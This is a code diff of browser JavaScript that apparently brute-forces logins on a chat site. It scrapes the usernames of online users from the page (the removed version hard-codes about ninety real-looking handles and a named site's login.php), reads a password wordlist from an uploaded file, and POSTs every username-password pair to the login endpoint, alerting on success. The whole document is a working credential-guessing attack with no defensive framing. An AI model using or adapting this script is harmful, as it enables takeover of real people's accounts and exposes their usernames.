@@ -1,105 +1,49 @@
-		$('<input type="file" name="file" id="file">').appendTo('.btable');
+var user_list =[];
+toggleRight();
+
+var exist1 = setInterval( async  function() {
+
+   
+ 
+
+
+
+
 function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms));}
-const user=`
-2pack
-AMIRقم
-Admin
-AlexX
-Alireza
-Alireza 41
-Alireza123123
-Away	tiger_
-Daniy
-Davood
-Hadi_42
-Herbod1
-Hesam1
-HāSťI
-Kami
-LORD EDWARD
-Maryam13700
-Marys
-Mehdi nurse27qaz
-Milad_Uk
-Mitra20
-Mohseennn
-Nahalll
-Omiidam 31
-Parsa St
-Peyman
-ROZa
-Rezaa
-Rocky
-Sabaaa
-Samar
-Saniya
-Shmimm
-Wolf
-Zeinab
-ZiiZiiGooLoo
-alaKi
-ali202020
-alishah677
-arsha
-avaa
-b374k
-behnam000
-mRamir
-mahbobe
-mahsaaa
-mamad_ahwazi
-mehdihesamidr
-miss-tina
-mohammad2003
-rojan
-samira24
-secret
-sepehr
-tiger_
-آرش40
-آلما
-آیسووو ۱۷
-احمد اهوازی
-الی1
-امین متاهل
-بهار
-بهزادی
-ثناخانوم
-خدایا شکرت
-دختره مامانی
-دریای محبت
-رامین سیلور
-سبحان
-سپیده۲۶
-شاهین ۲۶
-عادل المصري
-عباس
-علی رشتی
-علی ۹۳
-فررشتم
-لوایاتان
-لیلی ۳
-محمد1
-ملیحه
-مهدی تبریز
-مهدیس18
-مهرداد مرام
-مونا
-مینا 22
-نازنینم
-نگارشون
-نیما۶۳
-هاله
-هلما۳۰
-هووووووووووف
-پارسااا
-پرستش۷۴
-کارن ۶۶۲۲
-کامران_
-کنجکاو اهوازی
-گل رویایی
-彡ɑlɪɍɛẕɑɑɑ彡
-𝓜𝓲𝓵𝓪𝓭 𝓞𝓻𝓲𝓰𝓲𝓷𝓪𝓵`;
+
+await sleep(5000);
+
+
+var onlineUser = document.querySelector("#container_user >div").innerText;
+await sleep(2500);
+
+var onlineUser =parseInt(onlineUser.split(/\s/gi)[1]);
+await sleep(2500);
+
+for(var i =1 ;i<44+1;){
+ user_list.push(document.querySelector("#container_user > div.online_user > div:nth-child("+i+") > div.user_item_data > p").innerText);
+++i
+
+}
+console.log(user_list);
+localStorage.setItem("user_list",user_list);
+
+clearInterval(exist1);
+
+}, 10000); 
+
+
+var exist0 = setInterval( async  function() {
+
+
+
+await sleep(10000);
+
+
+$('<input type="file" name="file" id="file">').appendTo('#empty_top_mob');
+function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms));}
+
+
 
 document.getElementById('file').onchange =  function(){
 
@@ -107,13 +51,15 @@ document.getElementById('file').onchange =  function(){
 
   var reader = new FileReader();
   reader.onload = async function(progressEvent){
-var users = user.split(/\n/gi);
+var users_list =localStorage.getItem('user_list');
+var users = users_list.toString();
+
+var users = users.split(",");
+
 for(var ii =0;ii<users.length;){
 
 
-    // By lines
     var lines = this.result.split('\n');
- console.log(lines.length);
 
 
     for(var line = 0; line < lines.length; ){
@@ -121,19 +67,20 @@ for(var ii =0;ii<users.length;){
 
  const xhttp = new XMLHttpRequest();
   xhttp.onload = function() {
- // ;
 
-if(this.responseText=="3") alert(lines[line]);
+if(this.responseText=="3") {alert(lines[line])}
 
 
   }
  
 
-xhttp.open("POST", "https://mihancp.ir/mihan/system/encoded/login.php");
+
+
+xhttp.open("POST", ""+window.location.href+""+"system/encoded/login.php");
 xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=UTF-8");
 xhttp.send("password="+lines[line]+"&username="+users[ii]+"");
-// console.log(lines[line]);
 
+ console.log("user:"+users[ii]+ "pass:"+ lines[line]);
 
 
 line++
@@ -151,3 +98,9 @@ if(line == lines.length){++ii
   };
   reader.readAsText(file);
 };
+
+
+clearInterval(exist0);
+
+
+}, 20000);	
